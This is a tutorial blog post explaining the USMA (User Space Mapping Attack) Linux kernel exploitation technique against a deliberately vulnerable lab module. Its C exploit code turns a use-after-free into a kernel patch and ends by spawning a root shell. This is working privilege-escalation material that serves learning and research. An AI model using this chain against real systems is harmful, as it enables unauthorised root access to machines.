---
title: Linux Kernel Exploitation - USMA
date: 2025-05-02
categories: [Guide, Linux Kernel Exploitation]
tags: [linux, pwn]
---

In this post, I will explain USMA, a universal and data-only exploitation technique that allows us to patch kernel code from user space. Download the [handouts](https://github.com/r1ru/linux-kernel-exploitation/tree/main/USMA) beforehand.

## Analysis
The vulnerable LKM provides four commands: `CMD_ALLOC`, `CMD_READ`, `CMD_WRITE`, and `CMD_FREE`. These commands are used to allocate, read from, write to, and free an object defined as follows:
```c
#define OBJ_SIZE    0x200

struct obj {
    char buf[OBJ_SIZE];
};
```
Note that `obj_alloc` internally uses `kzalloc` with the `GFP_KERNEL` flag. This means the object will be allocated from kmalloc-512.
```c
static long obj_alloc(void) {
    if (obj != NULL) {
        return -1;
    }
    obj = kzalloc(sizeof(struct obj), GFP_KERNEL);
    if (obj == NULL) {
        return -1;
    }
    return 0;
}
```

## Bugs
In `obj_free`, `obj`, which is a reference to a freed memory region, is not cleared:
```c
static long obj_free(void) {
    kfree(obj);
    return 0;
}
```
This results in an obvious UAF. Though we already have read and write primitives, privilege escalation is difficult since, as far as I know, there are no useful kernel objects in kmalloc-512. So in this post, we take a data-only approach using USMA. Data-only attacks are increasingly important in the current era (due to `CONFIG_CFI_CLANG`) and are widely used in real-world kernel exploits.

## USMA
USMA stands for User Space Mapping Attack. This attack leverages [packet sockets](https://man7.org/linux/man-pages/man7/packet.7.html). When a ring buffer is set up for a packet socket, an array of page addresses called `pg_vec` is allocated in the [`alloc_pg_vec`](https://elixir.bootlin.com/linux/v6.13/source/net/packet/af_packet.c#L4436). By using [`mmap`](https://elixir.bootlin.com/linux/v6.13/source/net/packet/af_packet.c#L4659-L4672), it is possible to map these pages into user space. The packet mmap feature is designed to enable high-speed packet processing by eliminating unnecessary copying between user space and kernel space. However, by overwriting the pointers in `pg_vec`, it is possible to map pages containing kernel code into user space and apply arbitrary patches.

A packet socket requires either the `CAP_NET_RAW` capability or a user namespace. In the distributed kernel, for simplicity, the `CAP_NET_RAW` capability is assigned to the exploit code.:
```bash
[ -e /dev/sdc ] && cat /dev/sdc > /bin/pwn && chmod 755 /bin/pwn && setcap cap_net_raw+ep /bin/pwn
```

## Exploitation
First, we allocate and free the victim object:
```c
puts("[*] Allocating a victim object from kmalloc-512");
obj_alloc();

puts("[*] Freeing the victim object");
obj_free();
```
Second, we allocate a `pg_vec` by calling `setsockopt` and overlap it with the freed victim object:
```c
puts("[*] Allocating a pg_vec to reclaim the memory");
unsigned int block_nr =  OBJ_SIZE / sizeof(char *);
struct tpacket_req req = {
    .tp_block_size = PAGE_SIZE,
    .tp_frame_size = PAGE_SIZE,
    .tp_block_nr = block_nr,
    .tp_frame_nr = block_nr,
};
assert(setsockopt(sockfd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) != -1);
```
Next, we leak the pointer in pg_vec and calcurate `page_offset_base`.

The Linux kernel has a [memory region](https://elixir.bootlin.com/linux/v6.13/source/Documentation/arch/x86/x86_64/mm.rst#L57), sometimes referred to as physmap. This region starts at `page_offset_base` and provides a direct mapping of the entire physical memory:
```
ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
```
Since the pointers in `pg_vec` point to this region, we can calculate `page_offset_base` from one of them. When KASLR is enabled, the value of `page_offset_base` is randomized in [`kernel_randomize_memory`](https://elixir.bootlin.com/linux/v6.13/source/arch/x86/mm/kaslr.c#L142-L146), and becomes `0xffff888000000000` plus a random offset. This random offset is always a multiple of `PUD_SIZE`:
```c
// See: https://elixir.bootlin.com/linux/v6.13/source/arch/x86/include/asm/pgtable_64_types.h
#define PUD_SHIFT	30
#define PUD_SIZE	(_AC(1, UL) << PUD_SHIFT)
#define PUD_MASK	(~(PUD_SIZE - 1))

// See: https://elixir.bootlin.com/linux/v6.13/source/arch/x86/mm/kaslr.c#L142-L146
void __init kernel_randomize_memory(void)
{
    ...
        entropy = remain_entropy / (ARRAY_SIZE(kaslr_regions) - i);
        prandom_bytes_state(&rand_state, &rand, sizeof(rand));
        entropy = (rand % (entropy + 1)) & PUD_MASK;
        vaddr += entropy;
        *kaslr_regions[i].base = vaddr;
    ....
}
```
`PUD_SIZE` is 1 GB, and since our system has less than 1 GB of physical memory, we can calcurate `page_offset_base` by simply applying a bitwise AND with `PUD_MASK` to the leaked pointer:
```c
puts("[*] Calculating page_offset_base from pg_vec[0].buffer");
unsigned long addr_page_offset_base;
obj_read((char *)&addr_page_offset_base, sizeof(addr_page_offset_base));
addr_page_offset_base &= PUD_MASK;
printf("[+] addr_page_offset_base = %#lx\n", addr_page_offset_base);
```
Next, we locate the kernel image in physmap. When KASLR is enabled, the physical address where the decompressed kernel is loaded is randomized in
[`kernel_randomize_address`](https://elixir.bootlin.com/linux/v6.13/source/arch/x86/boot/compressed/kaslr.c#L850) and becomes the base address of an available physical memory region plus a random value multiplied by `CONFIG_PHYSICAL_ALIGN`:
```c
// See: https://elixir.bootlin.com/linux/v6.13/source/arch/x86/boot/compressed/kaslr.c#L767-L791
static unsigned long find_random_phys_addr(unsigned long minimum,
                    unsigned long image_size)
{
    ...
    phys_addr = slots_fetch_random();
    ...
}

// See: https://elixir.bootlin.com/linux/v6.13/source/arch/x86/boot/compressed/kaslr.c#L531-L553
static u64 slots_fetch_random(void)
{
	unsigned long slot;
	unsigned int i;

	/* Handle case of no slots stored. */
	if (slot_max == 0)
		return 0;

	slot = kaslr_get_random_long("Physical") % slot_max;

	for (i = 0; i < slot_area_index; i++) {
		if (slot >= slot_areas[i].num) {
			slot -= slot_areas[i].num;
			continue;
		}
		return slot_areas[i].addr + ((u64)slot * CONFIG_PHYSICAL_ALIGN);
	}
    ...
}
```
Since we have already identified `page_offset_base` and have a write primitive, we can overwrite a pointer in `pg_vec` to map arbitrary physical memory pages into user space. By scanning the physical memory in steps of `CONFIG_PHYSICAL_ALIGN`, we can search for the decompressed kernel's base address:
```c
puts("[*] Locating the kernel image");
unsigned long addr_kernel_image = addr_page_offset_base + CONFIG_PHYSICAL_START;
while(1) {
    printf("[*] Trying %#lx\n", addr_kernel_image);
    obj_write((char *)&addr_kernel_image, 8);
    unsigned long *magic = mmap(NULL, PAGE_SIZE * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sockfd, 0);
    if (magic != MAP_FAILED && *magic == 0x3f4e258d48f78949) {
        printf("[+] addr_kernel_image = %#lx\n", addr_kernel_image);
        break;
    }
    addr_kernel_image += CONFIG_PHYSICAL_ALIGN;
}
```
`0x3f4e258d48f78949` is the machine code of `startup_64`, which is the entry point of the decompressed kernel:
![startup_64](/assets/img/posts/2025-05-02-5/startup_64.png)

Next, we patch [`ns_capable_setid`](https://elixir.bootlin.com/linux/v6.13/source/kernel/capability.c#L418-L421) used in the checks inside [`__sys_setresuid`](https://elixir.bootlin.com/linux/v6.13/source/kernel/sys.c#L676), to always return true:
```c
unsigned long addr_ns_capable_setid = addr_kernel_image + 0x7ee50;
unsigned long addr_victim_page = addr_ns_capable_setid & (~0xfff);
printf("[+] addr_ns_capable_setid = %#lx\n", addr_ns_capable_setid);
printf("[*] Mapping %#lx to the user space\n", addr_victim_page);
obj_write((char *)&addr_victim_page, 8);
char *victim_page = mmap(NULL, PAGE_SIZE * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sockfd, 0);
assert(victim_page != MAP_FAILED);

puts("[*] Overwitting ns_capable_setid");
char payload[] = {
    0xf3, 0x0f, 0x1e, 0xfa,                     // endbr64
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,   // mov rax, 1
    0xc3                                        // ret
};
memset(victim_page, '\x90', 0xe50);
memcpy(victim_page + 0xe50, payload, sizeof(payload));
```
By running this exploit, we can confirm that `ns_capable_setid` has been overwritten:
![patch](/assets/img/posts/2025-05-02-5/patch.png)

Finally, we escalate privileges using `setreusuid` and spawn a shell:
```c
setresuid(0, 0, 0);

if (getuid() == 0) {
    puts("[+] Success");
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
} else {
    puts("[-] Fail");
}
```
By running this exploit, we can achive root privilege and see the flag:
![win](/assets/img/posts/2025-05-02-5/win.png)

## References
1. Yong Liu, Xiaodong Wang and Jun Yao. USMAï¼šShare Kernel Code with Me. https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code-wp.pdf
2. Andrey Konovalov. 2017. Exploiting the Linux kernel via packet sockets. https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
3. @0xAX. Kernel booting process. Part 6. https://0xax.gitbooks.io/linux-insides/content/Booting/linux-bootstrap-6.html
